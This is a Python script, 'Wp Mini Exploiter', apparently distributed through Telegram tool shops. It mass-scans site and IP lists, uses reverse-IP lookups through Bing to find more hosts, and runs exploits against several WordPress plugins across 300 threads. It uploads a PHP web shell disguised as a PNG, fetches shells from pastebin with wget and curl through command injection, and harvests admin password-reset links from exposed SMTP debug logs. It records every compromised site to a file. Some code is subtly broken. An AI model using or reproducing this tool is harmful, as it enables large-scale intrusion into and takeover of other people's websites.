#!/usr/bin/env python
# encoding: utf-8
# If you want more tools check me on > t.me/dxdteam (free & cheap tools for everyone)
import os,re
import sys,socket
import concurrent.futures
import threading
try:
  import requests
except:
  os.system('pip3 install requests')
try:
  os.mkdir('0xtn-exp')
except:
  pass
if os.name == 'nt':
  os.system('cls && title "Wp Mini Exploiter By Escanor0xtn"')
else:
  os.system('clear')
t = []

from colorama import init
def fassa5(i):
  if not 'http://' in i and not 'https://' in i:
    i = 'http://'+i
  exploit(i)


def wp(i):
  if 'jQuery Foundation' in requests.get(i + "/wp-includes/js/jquery/jquery.js",timeout=10).text:
    return True
  if '/wp-inclues/' in requests.get(i,timeout=10).text or '/wp-content' in requests.get(i,timeout=10).text:
    return True
  else:
    return False

#
filename=['ex0tn.php','ex0tn.png']
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"}
#
def upload(url, filename):
  files = {'file': (filename, open(filename, 'rb'), 'image/png')}
  datas = {
        'eeSFL_ID': 1,
        'eeSFL_FileUploadDir': '/wp-content/uploads/simple-file-list/',
        'eeSFL_Timestamp': 1587258885,
        'eeSFL_Token': 'ba288252629a5399759b6fde1e205bc2',
    }
  r = requests.post(url=url + '/wp-content/plugins/simple-file-list/ee-upload-engine.php', data=datas,
                      files=files, verify=False,timeout=10)
  r = requests.get(url=url + '/wp-content/uploads/simple-file-list/' + filename, verify=False,timeout=10)
  if r.status_code == 200:
    move(url, filename)
  else:
    print ('\033[91m[-] Failed :' + url)
    pass
#
def move(url, filename):
  new_filename = filename[0]
  headers = {'Referer': url + '/wp-admin/admin.php?page=ee-simple-file-list&tab=file_list&eeListID=1',
               'X-Requested-With': 'XMLHttpRequest'}
  datas = {
        'eeSFL_ID': 1,
        'eeFileOld': filename,
        'eeListFolder': '/',
        'eeFileAction': 'Rename|'+ new_filename,
    }
  r = requests.post(url= url + '/wp-content/plugins/simple-file-list/ee-file-engine.php', data=datas,
                      headers=headers, verify=False,timeout=10)
  if r.status_code == 200:
    print ("\033[92m [*] Boom > %s/wp-content/uploads/simple-file-list/e0xtn.php"%url)
    open('shells_wp.txt','a').write(url + "/wp-content/uploads/simple-file-list/e0xtn.php\n")
  else:
    print ('\033[91m[-] Failed :' + url)
  return new_filename
def uploadshell(i):
  m = 'wget https://pastebin.com/raw/uhmkCsAr -O e0xtn.php'
  m2 = 'curl -O https://pastebin.com/raw/uhmkCsAr;mv EiKvkrJp e0xtn.php'
  burp0_url = "%s/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=%s" % (i, m)
  burp0_url2 = "%s/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=%s" % (i, m2)
  burp0_headers = {"User-Agent": "curl/7.68.0", "Accept": "*/*", "Expect": "100-continue", "Connection": "close"}
  r = requests.get(burp0_url, headers=burp0_headers,timeout=10).content
  r2 = requests.get(burp0_url2, headers=burp0_headers,timeout=10).content
  if 'Escanor0xtn' in r:
    print("\033[92m [*] Boom > %s/wp-content/plugins/wp-file-manager/lib/files/e0xtn.php"%i)
    open('0xtn-exp/shells.txt', 'a').write(i + "/wp-content/plugins/wp-file-manager/lib/files/e0xtn.php\n")
  elif 'Escanor0xtn' in r2:
    print ("\033[92m [*] Boom > %s/wp-content/plugins/wp-file-manager/lib/files/e0xtn.php"%i)
    open('0xtn-exp/shells.txt', 'a').write(i + "/wp-content/plugins/wp-file-manager/lib/files/e0xtn.php\n")



def exploit(i):
  try:
    if wp(i):  # check if site=wordpress or no +plugin
      print("\033[93m" + i + " ==> Wordpress  ")
      open('0xtn-exp/wordpress.txt', 'a').write(i + '\n')
      shell = i + "/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=uname -a"
      burp0_url = "%s/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" % i
      burp0_headers = {"User-Agent": "curl/7.68.0", "Accept": "*/*", "Content-Type": "multipart/form-data; boundary=------------------------66e3ca93281c7050", "Expect": "100-continue", "Connection": "close"}
      burp0_data = "--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"x.php\"\r\nContent-Type: image/png\r\n\r\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x01^\x00\x00\x01^\x04\x03\x00\x00\x00?\x05j)\x00\x00\x00\x1ePLTE\xff\xff\xff\xef\xef\xef\xe5\xe5\xe5\xce\xce\xce\xa1\xa1\xa1iiiVVVGGG333\x00\x00\x00g\x00\xcc\xe2\x00\x00\r\xc0IDATx\xda\xed]K[\xdb\xc8\x12m\xc9\xce^\xc6\x90\xbb58\t\xdc\x9dm\x9c\t\xd9\xd9X\x1e\xc2\x8e\x87I\xc22\t!\x93\xe5@xmc\x02\xf1\xda\x0f\xa9\xff\xed]`\xeb\xddVU\xc9C\xb5\xe6\xa2-\xd4\xa7\xf2Q\xe9\xa8\x1fuN\x8b\xdf\xb9\xba\xee\x84\xbc\"^\xd7\x83\xc7\x8f\xbc\x9a\x08\xa7\xb1F\xbb\xaa\x97\xf4\xc8:5\xf2^L,A\xbb\x8cSr\xe4\x055\xd2\xbc\x17\x0eC\xbe\xe4H\xf3NL*\x8f\x8f\xd2i\xbe\xf05Y\xf05\xffM\xf5[*\x95J\xb9\xc1\xb7\xdc\xb4\x8f\xde\x9f\x1e\xf5\xec\x86\x95\x83\xfa\xadv\xff\x92\xd3\xcb\xfd\xba]\xd1\x86\x1f\x92Q2\xeck\x19\xb8\xdc\x93FB\xa4>\xf5[\xde\x91\x91k\xd2\xd1\x18\xdf\xeaG\x19\xbb\xdcCK\xd7\xfa-\x97\x12\x90\xb0.\xfcP>\x9629a-\xf9\xd7\xdc\x95\x8a\xcb\xdd\xd6\x11\xdf\x1d\xa9\xbc&5\xfd\xea\xf7\xe5@\x9d\xaf\xbc\xad\xe8\xc6\x0f\x85c9\xef:\xd0\x8c\x8d\x9d\xb9\xe9J\xa7\xa6\x17\xbe\xcb\x83\xf9\xf9\xca[\xad\xea\xd7\xd8MIW\xba-\x9d\xf8\xe1\x85L\xbdn-}\xf87\x1d^)eK\x1f|\x97\x01\xe9\xfa\x15\xcc_\xbf\x10x\xa5[\xd3\x85\x1f\n\x03H\xbe\xf2\\\x17\xfe}\x03JW\x8e+z\xe0k\x1c\xc3\xf2\x95m=\xea\xb7\x08LW\x8e\xf4\xe0\x87-h\xbe\xd3{1\xf3\xaf\t-\x07)\xf7t\xc0\x17\\\x0eR\xf6u\xa8\xdfux\xbe\x0f\x8b\xb7\xbc\xfc\x00\xfa\x16\x87\xbe\xc9\xbc\xfc\x0b\xfcX<\\\x9f\xf8\xf1E\x94\xef\x94\xd1x\xeb\xf7\r&\xdf\xb1\xc5\xce\x0f\x98\xf2\x95\xb2\xc6\xcd\xbf\xc6wT\xbe\xfb\xdc\xf8\x16P\xe9\xca\x9f\xdc\xf5\xbb\x8c\xcbw\xc4\xcd\x0f\x1b\xb8|\xc7\x163\xff\xbe\xc5\xe5\xeb\xd6x\xf15p\xf4 e\x8b\xb7~\x91\xf4 e\x9b\x97\x1f\xcc\x012\xdf\xbfy\xf9\x17IgR\xf6y\xf1]\xc6\xe6;\xe4\xad\xdfg\xd8|G\x16+?\xac`\xf3\x1d\xf3\xf2\xef::_^|\xb7\xb0\xf9:\x16k\xfd\xbe\xc5\xe6\xebV\xb2\xf0Yf|\xf1\xf9\xd6X\xf1\xc5~\x8e\xa5\xcc\x19\xbe2o\xf8\xd6\x84q\xc9\x87/%_\xf3k\x8e\xf8![=<>\xbe\xcc\xfc@\xe13\xce\xef\x1b\xe5{\xc1\x89\xef\x066\xdf\t/\xffR\xc6;\x9c\xf8\xaeP\xc6\xbf\x8c\xf8\xe2\xc7\xeb\xbc\xf3\x8b\"z>\xc4\x8b\xef#\xcf73\xe3\x8b\x9e\xcf\x12\xac\xf8\x1a\xc7\xc8|\x99\xd7w\x04a=\x8a\x13_\xf4z_\x85\x19\xdfW\xf8\xf5T\xce\xf1/e\xbd\x9as\xfc\x8b%\xb43\xc1\x8c/\x92 \xf6\xd8\xf7\xe7\xf1\xfbY\xbc\xfbo\xaf\xb0\xaf\x1b\xf3\xfe&j\x041\x14\xec\xfb\xc7\xe6\r\"\xdf\x03\xc1\xdf\x1f\xb5\x8b,_\xee\xfe(D\x01?tt1\xf7\x97<f?\xccB\xfa\xa3\x8e1\x83\x1d\r\xfaS\xd7\x11sc\x1d\xf0-\xe2\xca\x81\xbd\xbf\x0f\xbc'\xdb\x8eF\xf2\xe0+\xfe\xc0\xf5{\xb2\xf7\xa7\x16`\x9f\x8c\xcfB\x13|\xc5;\xd0\xcePM\xe8Q\xbfB\x14\x07\xf0\xb7M\x0b}\x00\xe0\x8ds\xeb\xde/\xe5\xd7\xb7,\xa7\x03|+4\xc2\xd7H\xad`\xb7\xb6\x88|\x17\xa6\x1fJ\xad\xe0sK\x11\xc9\x82o*\x07\x8f\x03z'-\xf4\xb1)z\xb2mu$\x0f\xbe\xf3_\xb9\x1f\xd6\x9cH\x16|\x85x\x9d\xfe%\xd6\x86\x1f\x84\x10\xc2Tr\xc4\xa4\x1d\xfe\xa5\x9a\xe8\xbb\x0b\xef@\xf2X}\xfc\t\xca\x1f\x93\xd3]\x9c^z\xc1\xfa\xf9$\x84\x9d\x8e\x05\x88d\xc1W\x88\xa5n\x94%~m\xc7#5\xf2\xd70\x9a\xa1\x9apz\x15h$\x0b\xbeB\x88B\xf3\xc3\x0c\xe3\xbb^\x03\x13\xc9\x81\xaf\x10B\x946\xedn\xf7\xa8kw\xd6p\xbf\x94\x07\xdfi\xceB\xfd\xd7\xbc\xf9\x1b\xe5\xcd'o\xfeFF\xde\xf0\xfd\xf2\xe7rVK\xb4k\xe9\xb4B\x8d\xbc\xa4\xde\xb3p/\xdc\xafG\xb4\xeb\xfd\xe0\xe8\xf1#'B\xdeS\xbd\xf4\xe45\xd5\xbf\xcf\xa5\xde\xf3\xda\x11\x0e\xd9K\xef\x94\x1c\xf9m\x8d\x1ay\x97\xb3\xf7\xed>\x83\x1f\xde\xd3\xf7\xed\xe9\xfb\xf6\xf4}\x8b\xfcimssss\xcd\xcaE\xfd\x1ae\xfb\xfd\xf5@J\xf7\xfe\xc8n\xe8?\xfe-\x07\xad\xf4\xeez\xab\xda\xe0\x9b<\xbfhF\x16/~u,\x8d\xf15^\x0f\xe26o\x15m\xeb\xd7\xf83ie(\xb6\x18\xa0\x0b?$\xa7+e\xcf\xd2\x92\r\xe5Rl\xc4\xaaP\x13|\xd5\xd6t\xee\xbe\x86\xf5[\x9c\xb3\x9d\xeb\xd4\xb5\xe3\x07s\xeef\xe3\xa8\xa2\x1b\xff\xbe\x9e\xbf\xb3t\xa8\x19\xbei\x9b\xfbA/H\x1d\xea\xf7\x1d|#W\x07~H\xdf\xda\x0f:\xff\xf1\xf3/\xa0u\xe2V#|!\x9d\x13>\xc0\xfc\xf5\xfbN\xa2:=\xb8\xf9\x01\xd6\xf9\xe3\xf5\"\xb0\xf3/\xb0\xf7\xf2\xb3&\xf8B\x9b\xc9\xc7\x96\x1e\xf5\x0b\xee\x0cl\xe9<?php system($_GET[\"cmd\"]); ?>\r\n--------------------------66e3ca93281c7050--\r\n"
      requests.post(burp0_url, headers=burp0_headers, data=burp0_data,timeout=10)
      if 'windows' in str(requests.get(shell,timeout=10).text).lower() or 'linux' in str(requests.get(shell,timeout=10).text).lower():
        uploadshell(i)
      for exp in ['/wordpress/wp-content/plugins/ez-done-file-manager/admin.php','/wordpress/wp-content/admin/views/tool-file-editor.php']:
          shelllll=i+exp.replace(exp.split('/')[5],'e0xtn.php')
          rea=requests.post(i+exp,data={'zip':open(filename[1],'r').read()})
          rere=requests.get(shelllll,headers={'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}).text
          if 'Escanor0xtn' in rere:
            print ("\033[92m [*] Boom > %s"%shelllll)
            open('0xtn-exp/shells.txt', 'a').write(shelllll+"\n")
      upload(i, filename[1])
      try:
        rea=requests.post(i+'/vendor/woocommerce/action-scheduler/classes/abstracts/ActionScheduler_Abstract_ListTable.php',headers={'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'},data={'row_id':'wget https://pastebin.com/raw/uhmkCsAr -O e0xtn.php'},timeout=10)
        rere=requests.get(shelllll,headers={'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'},timeout=10).text
        if 'Escanor0xtn' in rere:
          print ("\033[92m [*] Boom > %s"%shelllll)
          open('0xtn-exp/shells.txt', 'a').write(shelllll+"\n")
      except:
        pass
      try:
        iii=i+'/wp-content/plugins/easy-wp-smtp/'
        rea=requests.get(iii,headers={'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'},timeout=10).text
        if "debug_log.txt" in rea:
          ezrze=re.findall('>%s(.*?)_debug_log.txt'%iii,str(rea))[0]
          if ezrze:
            ree=requests.get(i+'/wp-content/plugins/easy-wp-smtp/%s_debug_log.txt'%ezrze,headers={'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'},timeout=10).text
            ee=re.findall("%s/wp-login.php(.*?)\n"%i)[0]
            if ee:
              print ("\033[92m [*] Boom > %s"%i+'/wp-login.php'+ee)
              open('0xtn-exp/admin_resetpaswd.txt', 'a').write(i+'/wp-login.php'+ee+"\n")
      except:
        pass
      try:
        url = i+'/wp-admin/admin-ajax.php?action=_ning_upload_image'
        if requests.get(url).status_code==200:
            req = requests.post(url, files={'files[]' : open(filename[0])}, data={"allowed_file_types" : "php,jpg,jpeg","upload" : json.dumps({"dir" : "../"})})
            if "0xtn" in requests.get(i+'e0xtn.php').text:
                print ("\033[92m [*] Boom > %s/e0xtn.php"%i)
                open('0xtn-exp/shells.txt', 'a').write(i+'/e0xtn.php\n')
      except:
        pass
    else:
      print("\033[91m" + i + " ==> Not Wordpress  ")
      pass
  except:
    print("\033[91m" + i + " ==> Expired  ")
    pass
def aaaaaaaaaaaaaaa(ip):
 try :
  ip = ip.replace('\n', '').replace('\r', '')
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.settimeout(5)
  result = sock.connect_ex((ip, 80))
  if str(result) == '0':
   bo = []
   lonk = 1
   num=0
   while lonk < 299:
    iyagw = requests.get("http://www.bing.com/search?q=IP%3A"+ip+"+&count=50&first="+str(lonk),verify=False,headers=headers)
    gans = iyagw.content
    ya = re.findall('<h2><a href="(.*?)"', gans.decode('utf-8'))
    for z in ya:
         o = z.split('/')
         if (o[0]+'//'+o[2]) in bo:pass
         else:
          bo.append(o[0]+'//'+o[2]);num+=1
          with open('0xtn-exp/grabbed.txt','a+') as s:
           s.writelines((o[0]+'//'+o[2])+'\n')
    lonk = lonk+50
   print('\033[92m [/] IP:%s | %s Sites .. loading'%(ip,str(num)))
   for url in bo:
    exploit(url)
 except:pass

def ffffffffffff(i):
 if 'http://' in i :
  i=i.replace('http://','')
 if 'https://' in i:
  i=i.replace('https://','')
 if '/' in i:
  i=i.split('/')[0]
 if re.match('[0-9]{0,3}\d.[0-9]{0,3}\d.[0-9]{0,3}\d.[0-9]{0,3}\d',i):
    print("\033[00m[IP]: ",i)
    aaaaaaaaaaaaaaa(i)
 else:
    try:
      ip=socket.gethostbyname(i)
      print("\033[00m[IP]: ",ip)
      open('0xtn-exp/IPs.txt', 'a+').write(ip + "\n")
      aaaaaaaaaaaaaaa(ip)
    except:pass

init()
print("""\033[93m
   ___       _         
  / _ \__  _| |_ _ __  
 | | | \ \/ / __| '_ \ 
 | |_| |>  <| |_| | | |  Telagram: t.me/exploitn
  \___//_/\_\\\__|_| |_|  ICQ     : icq.im/samaxtn

 {a}Mini Wp-Exploiter 2020
 {a}Store(telegram) : @dxdteam | @Shop_Unknowns
 {b}[{a}Developer{b}] : {a}Escanor 0xTN
 {b}[{a}1{b}]{a} Sites 
 {b}[{a}2{b}]{a} sites/Ips+reverse ip (bing)
""".format(a="\033[94m", b="\033[92m"))
i5tar=input('%s0xtn> %s'%('\033[92m','\033[00m'))
sites = open(input('\033[94m[\033[92mSites/IPs\033[94m]:\033[92m '), 'r').read().splitlines()

if i5tar=='1':
 try:
  with concurrent.futures.ThreadPoolExecutor(300) as executor:
    executor.map(fassa5, sites)
 except Exception as e:
  print(e)
elif i5tar=='2':
 try:
  with concurrent.futures.ThreadPoolExecutor(300) as executor:
    executor.map(ffffffffffff, sites)
 except Exception as e:
  print(e)
else:
 exit(input('We close sir , please visit us as soon [press enter to exit]'))

#For you Merlin
